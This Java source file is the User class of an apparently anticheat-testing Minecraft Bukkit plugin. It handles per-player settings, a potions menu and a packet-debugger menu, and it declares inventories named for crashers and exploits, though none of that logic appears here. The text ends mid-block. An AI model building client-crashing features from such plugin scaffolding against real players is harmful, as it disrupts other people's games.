package me.killstorm103.Rebug.Utils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.potion.Potion;
import org.bukkit.potion.PotionType;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.viaversion.viaversion.api.Via;
import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;

import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Main.Rebug;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import net.minecraft.server.v1_8_R3.BlockPosition;
import net.minecraft.server.v1_8_R3.ChatComponentText;
import net.minecraft.server.v1_8_R3.DataWatcher;
import net.minecraft.server.v1_8_R3.EntityCreeper;
import net.minecraft.server.v1_8_R3.EntityLiving;
import net.minecraft.server.v1_8_R3.EntityPlayer;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.IChatBaseComponent;
import net.minecraft.server.v1_8_R3.MobEffect;
import net.minecraft.server.v1_8_R3.Packet;
import net.minecraft.server.v1_8_R3.PacketDataSerializer;
import net.minecraft.server.v1_8_R3.PacketPlayOutBed;
import net.minecraft.server.v1_8_R3.PacketPlayOutChat;
import net.minecraft.server.v1_8_R3.PacketPlayOutCollect;
import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityStatus;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;
import net.minecraft.server.v1_8_R3.PacketPlayOutNamedEntitySpawn;
import net.minecraft.server.v1_8_R3.PacketPlayOutPlayerInfo;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;
import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntityLiving;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import net.minecraft.server.v1_8_R3.Vec3D;
import net.minecraft.server.v1_8_R3.IChatBaseComponent.ChatSerializer;

public class User 
{
	private final Player player;
    private static User user;
    private String brand = null, register = null;
    private int protocol;
    
    public boolean ShowS08Alert = true, Builder = false, ClientCommandChecker = false, SentUpdatedCommand = false, Infinite_Blocks, InvSeed = false, CancelInteract = false, AutoCloseAntiCheatMenu, Hunger, Fire_Resistance, Damage_Resistance, Exterranl_Damage, Vanilla1_8FlyCheck, Vanilla1_9FlyCheck, NotifyFlyingKick1_8, NotifyFlyingKick1_9, PotionEffects, AutoRefillBlocks, AntiCheatKick, AllowMentions, ProximityPlayerHider, HideOnlinePlayers, AllowDirectMessages, ShowFlags, ShowPunishes, ShowSetbacks, FallDamage;
    
    public org.bukkit.Location death_location;
    public String AntiCheat, NumberIDs = "", Keycard, HackedUUID;
    public int SelectedAntiCheats = 0;
    
    public Player CommandTarget; 
    public Map<String, Boolean> AlertsEnabled = new HashMap<>();
    public int  S08Pos = 0, UnReceivedBrand = 0, ShouldTeleportByBow = 0, preSend = 0, preReceive = 0, sendPacketCounts = 0, receivePacketCounts = 0, BrandSetCount = 0, ClicksPerSecond = 0, preCPS = 0, Yapper_Message_Count = 0,
    potionlevel = 1, potion_effect_seconds = 240;
    public double lastTickPosX = 0, lastTickPosY = 0, lastTickPosZ = 0;
    public long timer_balance = 0, joined = 0;
    public float yaw, pitch;
    
    public Player getPlayer ()
    {
    	return this.player;
    }
    public final UUID getUUID ()
    {
    	return getPlayer().getUniqueId();
    }
    public final String getName ()
    {
    	return getPlayer().getName();
    }
	public User (Player player)
    {
        setUser(this);
        this.HackedUUID = UUID.randomUUID().toString();
        this.Keycard = ".say " + HackedUUID; 
        AlertsEnabled.clear();
        this.AntiCheat = Rebug.getINSTANCE().getLoadedAntiCheatsFile().getString("default-anticheat");
        this.AntiCheat = PT.isStringNull(this.AntiCheat) ? "Vanilla" : this.AntiCheat;
        this.SelectedAntiCheats = this.AntiCheat.equalsIgnoreCase("Vanilla") ? 0 : 1;
        this.player = player;
        LoadDefault();
        this.protocol = getNumber ();
        this.joined = System.currentTimeMillis() + (5 * 1000);
    }
	private void LoadDefault ()
	{
		// Player Settings
		this.HideOnlinePlayers = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Hide Online Players");
		this.ProximityPlayerHider = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Proximity Player Hider");
		this.NotifyFlyingKick1_8 = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Notify Flying Kick 1.8.x");
		this.NotifyFlyingKick1_9 = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Notify Flying Kick 1.9");
		this.Vanilla1_8FlyCheck = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Vanilla 1.8.x fly Check");
		this.Vanilla1_9FlyCheck = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Vanilla 1.9 fly Check");
		this.Fire_Resistance = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Fire Resistance");
		this.Damage_Resistance = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Damage Resistance");
		this.Hunger = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Hunger");
		this.Exterranl_Damage = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Exterranl Damage");
		this.FallDamage = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Fall Damage");
		this.AutoCloseAntiCheatMenu = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Auto Close AntiCheat Menu");
		this.AntiCheatKick = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("AntiCheat Kick");
		this.ShowFlags = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Show Flags");
		this.ShowPunishes = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Show Punishes");
		this.ShowSetbacks = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Show Setbacks");
		this.AllowDirectMessages = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Allow Direct Messages");
		this.PotionEffects = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Allow Potion Effects");
		this.AutoRefillBlocks = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Auto Refill Blocks Placed");
		this.AllowMentions = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Allow Mentions");
		this.Infinite_Blocks = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Infinite Blocks");
		this.Yapper_Message_Count = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getInt("Yapper");
		this.ShowS08Alert = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("S08 Alerts");
		this.ClientCommandChecker = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Client Command Checker");
		
		// PacketDebugger Settings
		this.FlyingPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Flying");
        this.PositionPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Position");
        this.PositionLookPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("PositionLook");
        this.LookPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Look");
        this.ArmAnimationPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Arm Animation");
        this.HeldItemSlotPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Held Item Slot");
        this.DiggingPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Digging");
        this.BlockPlacePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Block Place");
        this.EntityActionPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Entity Action");
        this.CloseWindowPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Close Window");
        this.ClickWindowPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Click Window");
        this.SettingsPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Client Settings");
        this.StatusPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Client Status");
        this.AbilitiesPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Abilities");
        this.KeepAlivePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Keep Alive");
        this.TransactionPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Transaction");
        this.SpectatePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Spectate");
        this.SteerVehiclePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Steer Vehicle");
        this.CustomPayLoadPacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Custom PayLoad");
        this.TabCompletePacket = Rebug.getINSTANCE().getDefaultPlayerSettingsConfigFile().getBoolean("Tab Complete");
	}
	
	public Inventory getPotionsMenu ()
	{
		if (PotionsMenu == null)
		{
			Inventory inventory = PT.createInventory(getPlayer(), 18, ChatColor.RED + "Potions");
			int add = 0;
			
			for (PotionType pots : PotionType.values())
			{
				Potion pot = new Potion(pots);
				if (pots != null && !pots.name().equalsIgnoreCase("water") && pot != null)
				{
					item = Reset(pot.toItemStack(1));
					String name = pot.getType().name().replace(" ", "_").toLowerCase();
					name = name.replace("jump", "jump_boost").replace("instant_heal", "instant_health").replace("regen", "regeneration");
					itemMeta.setDisplayName(ChatColor.GREEN + name);
					item.setItemMeta(itemMeta);
					inventory.setItem(add++, item);
				}
			}
			item = Reset(Material.POTION, 1, (short) 0, (byte) 16387);
			itemMeta.setDisplayName(ChatColor.GREEN + "resistance");
			item.setItemMeta(itemMeta);
			inventory.setItem(13, item);
			
			item = Reset(Material.MILK_BUCKET);
			lore.add("Clear potion effects");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(17, item);
			
			
			for (int i = 0; i < inventory.getSize(); i ++)
			{
				ItemStack item = inventory.getItem(i);
				if (item != null && item.getType() != Material.MILK_BUCKET)
				{
					this.item = Reset(item);
					lore.add(ChatColor.BLUE + "Seconds: " + potion_effect_seconds);
					lore.add(ChatColor.BLUE + "Level: " + potionlevel);
					lore.add("");
					lore.add(ChatColor.BLUE + "Use /potion");
					lore.add(ChatColor.BLUE + "To change potion settings!");
					itemMeta.setLore(lore);
					this.item.setItemMeta(itemMeta);
				}
			}
			
			PotionsMenu = inventory;
		}
		
		return PotionsMenu;
	}
	public Location getLocation ()
	{
		return this.player.getLocation();
	}
	public String getDebugLocation ()
	{
		return "Player= " + getPlayer().getName() + " Loc= " + "(world: " + getWorld().getName() + ") " + 
				"(x: " + getLocation().getBlockX() + ") " + "(y: " + getLocation().getY() + ") " + "(z: " + getLocation().getBlockZ() + ") " + "(yaw: " + getLocation().getYaw() + ") " + "(pitch: " + getLocation().getPitch() + ")";
	}
	public void sendMessage (String message)
	{
		message = message.replace(Rebug.RebugMessage, "");
		this.player.sendMessage(Rebug.RebugMessage + message);
	}
	public String getColoredAntiCheat () 
	{
		if (this.SelectedAntiCheats > 1)
			return ChatColor.AQUA + "Multi";
		
		String strip = ChatColor.stripColor(AntiCheat).toLowerCase();
    	if (strip.equals("vanilla"))
    		return ChatColor.GREEN + "Vanilla";
    	
		return ChatColor.translateAlternateColorCodes('&', Rebug.getINSTANCE().getLoadedAntiCheatsFile().getString("loaded-anticheats." + strip + ".display-name"));
	}


    public String getValues (String menu, String SettingValue)
    {
    	String text = null;
    	if (!PT.isStringNull(menu) && !PT.isStringNull(SettingValue))
    	{
    		switch (menu.toLowerCase()) 
    		{
			case "player settings":
				switch (SettingValue.toLowerCase())
				{
				case "fall damage":
					text = ChatColor.AQUA + "Status: " + (FallDamage ? ChatColor.GREEN : ChatColor.DARK_RED) + FallDamage;
					break;
					
				case "exterranl damage":
					text = ChatColor.AQUA + "Status: " + (Exterranl_Damage ? ChatColor.GREEN : ChatColor.DARK_RED) + Exterranl_Damage;
					break;
					
				case "setbacks":
					text = ChatColor.AQUA + "Status: " + (ShowSetbacks ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowSetbacks;
					break;
					
				case "hunger":
					text = ChatColor.AQUA + "Status: " + (Hunger ? ChatColor.GREEN : ChatColor.DARK_RED) + Hunger;
					break;
					
				case "potions":
					text = ChatColor.AQUA + "Status: " + (PotionEffects ? ChatColor.GREEN : ChatColor.DARK_RED) + PotionEffects;
					break;
					
				case "auto refill blocks":
					text = ChatColor.AQUA + "Status: " + (AutoRefillBlocks ? ChatColor.GREEN : ChatColor.DARK_RED) + AutoRefillBlocks;
					break;
					
				case "hide all online players":
					text = ChatColor.AQUA + "Status: " + (HideOnlinePlayers ? ChatColor.GREEN : ChatColor.DARK_RED) + HideOnlinePlayers;
					break;
					
				case "proximity player hider":
					text = ChatColor.AQUA + "Status: " + (ProximityPlayerHider ? ChatColor.GREEN : ChatColor.DARK_RED) + ProximityPlayerHider;
					break;
					
				case "auto close anticheats menu":
					text = ChatColor.AQUA + "Status: " + (AutoCloseAntiCheatMenu ? ChatColor.GREEN : ChatColor.DARK_RED) + AutoCloseAntiCheatMenu;
					break;
					
				case "direct messages":
					text = ChatColor.AQUA + "Status: " + (AllowDirectMessages ? ChatColor.GREEN : ChatColor.DARK_RED) + AllowDirectMessages;
					break;
					
				case "allow mentions":
					text = ChatColor.AQUA + "Status: " + (AllowMentions ? ChatColor.GREEN : ChatColor.DARK_RED) + AllowMentions;
					break;
					
				case "flags":
					text = ChatColor.AQUA + "Status: " + (ShowFlags ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowFlags;
					break;

				case "punishes":
					text = ChatColor.AQUA + "Status: " + (ShowPunishes ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowPunishes;
					break;
					
				case "kick":
					text = ChatColor.AQUA + "Status: " + (AntiCheatKick ? ChatColor.GREEN : ChatColor.DARK_RED) + AntiCheatKick;
					break;
					
				case "infinite blocks":
					text = ChatColor.AQUA + "Status: " + (Infinite_Blocks ? ChatColor.GREEN : ChatColor.DARK_RED) + Infinite_Blocks;
					break;
					
				case "damage resistance":
					text = ChatColor.AQUA + "Status: " + (Damage_Resistance ? ChatColor.GREEN : ChatColor.DARK_RED) + Damage_Resistance;
					break;
					
				case "fire resistance":
					text = ChatColor.AQUA + "Status: " + (Fire_Resistance ? ChatColor.GREEN : ChatColor.DARK_RED) + Fire_Resistance;
					break;
					
				case "s08 alerts":
					text = ChatColor.AQUA + "Status: " + (ShowS08Alert ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowS08Alert;
					break;
					
				case "client command checker":
					text = ChatColor.AQUA + "Status: " + (ClientCommandChecker ? ChatColor.GREEN : ChatColor.DARK_RED) + ClientCommandChecker;
					break;
					
				default:
					text = "Unknown " + menu + " Setting!";
					break;
				}
				break;
				
			case "vanilla fly checks":
				switch (SettingValue.toLowerCase())
				{
				case "notify on flying kick 1.8.x":
					text = ChatColor.AQUA + "Status: " + (NotifyFlyingKick1_8 ? ChatColor.GREEN : ChatColor.DARK_RED) + NotifyFlyingKick1_8;
					break;
					
				case "notify on flying kick 1.9+":
					text = ChatColor.AQUA + "Status: " + (NotifyFlyingKick1_9 ? ChatColor.GREEN : ChatColor.DARK_RED) + NotifyFlyingKick1_9;
					break;

				default:
					text = "Unknown " + menu + " Setting!";
					break;
				}
				break;

			default:
				text = "Unknown Menu!";
				break;
			}
    		
    	}
    	
    	return text;
    }
	public final int getVersion ()
    {
    	return Via.getAPI().getPlayerVersion(this.player.getUniqueId());
    }
    public final String getVersion_ ()
    {
    	return ProtocolVersion.getProtocol(this.protocol).getName();
    }
    public final String getVersion_Short ()
    {
    	String version = getVersion_();
    	int find = 0;
		if (version.contains("-"))
		{
			while (PT.SubString(version, find, version.length()).contains("-")) {find++;}
			
			version = PT.SubString(version, find, version.length());
		}
    	return version;
    }
	public String getRegister() {
		return register;
	}
	public void setRegister(String register) {
		this.register = register;
	}
	private int getNumber ()
    {
    	int game_version =- 1;
    	try
    	{
    		game_version = Via.getAPI().getPlayerVersion(this.player.getUniqueId());
    	}
    	catch (Exception e) {e.printStackTrace();}
    	
    	return game_version;
    }
	public String getBrand() {
		return brand;
	}
	
	public void setBrand(String brand) {
		this.brand = brand;
	}
	public int getProtocol() {
		return protocol;
	}

	public World getWorld ()
	{
		return this.player.getWorld();
	}
    public String ClientBrand ()
    {
    	return brand;
    }
    public static User getUser () 
    {
        return user;
    }
    public static void setUser(User userr) 
    {
        user = userr;
    }
	
	// Inventory
    public Inventory OldInventory, CrashersMenu, ExploitsMenu, SettingsMenu, VanillaFlyChecksMenu, SpawnEntityCrashersMenu, PotionsMenu, PacketDebuggerMenu;
 // Inventory Size can be: 9, 18, 27, 36, 45, 54

    // Packet Debugger
    public boolean AllowedToDebug = true;
    public boolean isPacketDebuggerEnabled ()
    {
    	return AllowedToDebug && Rebug.PacketDebuggerPlayers.containsKey(getPlayer().getUniqueId());
    }
    // Packets
    public boolean FlyingPacket = true, PositionPacket = true, PositionLookPacket = true, LookPacket = true, ArmAnimationPacket = true, HeldItemSlotPacket = true, DiggingPacket = true,
    BlockPlacePacket = true, EntityActionPacket = true, CloseWindowPacket = true, ClickWindowPacket = true, SettingsPacket = true, AbilitiesPacket = true, KeepAlivePacket = true, TransactionPacket = true
    , StatusPacket = true,
    SpectatePacket = true, SteerVehiclePacket = true, CustomPayLoadPacket = true, TabCompletePacket = true;
    
    public Inventory getPacketDebuggerMenu ()
    {
    	if (PacketDebuggerMenu == null)
    	{
    		Inventory inventory = PT.createInventory(getPlayer(), 36, ChatColor.GREEN + "Packet Selector");
    		item = Reset(FlyingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((FlyingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInFlying");
    		lore.add(ChatColor.GRAY + "Click to " + (!FlyingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(0, item);
    		
    		item = Reset(PositionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((PositionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPosition");
    		lore.add(ChatColor.GRAY + "Click to " + (!PositionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(1, item);
    		
    		item = Reset(PositionLookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((PositionLookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPositionLook");
    		lore.add(ChatColor.GRAY + "Click to " + (!PositionLookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(2, item);
    		
    		item = Reset(LookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((LookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInLook");
    		lore.add(ChatColor.GRAY + "Click to " + (!LookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(3, item);
    		
    		item = Reset(ArmAnimationPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((ArmAnimationPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInArmAnimation");
    		lore.add(ChatColor.GRAY + "Click to " + (!ArmAnimationPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(4, item);
    		
    		item = Reset(HeldItemSlotPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((HeldItemSlotPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInHeldItemSlot");
    		lore.add(ChatColor.GRAY + "Click to " + (!HeldItemSlotPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(5, item);
    		
    		item = Reset(DiggingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((DiggingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockDig");
    		lore.add(ChatColor.GRAY + "Click to " + (!DiggingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(6, item);
    		
    		item = Reset(BlockPlacePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((BlockPlacePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockPlacement");
    		lore.add(ChatColor.GRAY + "Click to " + (!BlockPlacePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(7, item);
    		
    		item = Reset(EntityActionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((EntityActionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInEntityAction");
    		lore.add(ChatColor.GRAY + "Click to " + (!EntityActionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(8, item);
    		
    		item = Reset(CloseWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((CloseWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCloseWindow");
    		lore.add(ChatColor.GRAY + "Click to " + (!CloseWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(9, item);
    		
    		item = Reset(ClickWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((ClickWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClickWindow");
    		lore.add(ChatColor.GRAY + "Click to " + (!ClickWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(10, item);
    		
    		item = Reset(SettingsPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((SettingsPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSettings");
    		lore.add(ChatColor.GRAY + "Click to " + (!SettingsPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(11, item);
    		
    		item = Reset(StatusPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((StatusPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClientStatus");
    		lore.add(ChatColor.GRAY + "Click to " + (!StatusPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(12, item);
    		
    		
    		item = Reset(AbilitiesPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((AbilitiesPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInAbilities");
    		lore.add(ChatColor.GRAY + "Click to " + (!AbilitiesPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(13, item);
    		
    		item = Reset(KeepAlivePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((KeepAlivePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInKeepAlive");
    		lore.add(ChatColor.GRAY + "Click to " + (!KeepAlivePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(14, item);
    		
    		item = Reset(TransactionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((TransactionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTransaction");
    		lore.add(ChatColor.GRAY + "Click to " + (!TransactionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(15, item);
    		
    		item = Reset(SpectatePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((SpectatePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSpectate");
    		lore.add(ChatColor.GRAY + "Click to " + (!SpectatePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(16, item);
    		
    		item = Reset(SteerVehiclePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((SteerVehiclePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSteerVehicle");
    		lore.add(ChatColor.GRAY + "Click to " + (!SteerVehiclePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(17, item);
    		
    		item = Reset(CustomPayLoadPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((CustomPayLoadPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCustomPayLoad");
    		lore.add(ChatColor.GRAY + "Click to " + (!CustomPayLoadPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(17, item);
    		
    		item = Reset(TabCompletePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
    		itemMeta.setDisplayName((TabCompletePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTabComplete");
    		lore.add(ChatColor.GRAY + "Click to " + (!TabCompletePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
    		itemMeta.setLore(lore);
    		item.setItemMeta(itemMeta);
    		inventory.setItem(18, item);
    		
    		PacketDebuggerMenu = inventory;
    	}
    	
    	return PacketDebuggerMenu;
    }
    
    public ArrayList<String> lore = new ArrayList<>();// clearing this as a test
	private ItemMeta itemMeta = null;
	private ItemStack item = null;
	public final Map<ItemStack, Integer> OldItems = new HashMap<>();
	public static final Map<ItemStack, Integer> TempItemsInvSee = new HashMap<>();
	static
	{
		@SuppressWarnings("deprecation")
		ItemStack tempstack =  new ItemStack(Material.WOOL, 1, (short) 0, (byte) 5);
		ItemMeta meta = tempstack.getItemMeta();
		meta.setDisplayName(ChatColor.GREEN + "Max Item");
		tempstack.setItemMeta(meta);
		TempItemsInvSee.put(tempstack, 16);
		@SuppressWarnings("deprecation")
		ItemStack tempstack2 = new ItemStack(Material.WOOL, 1, (short) 0, (byte) 14);
		ItemMeta meta2 = tempstack2.getItemMeta();
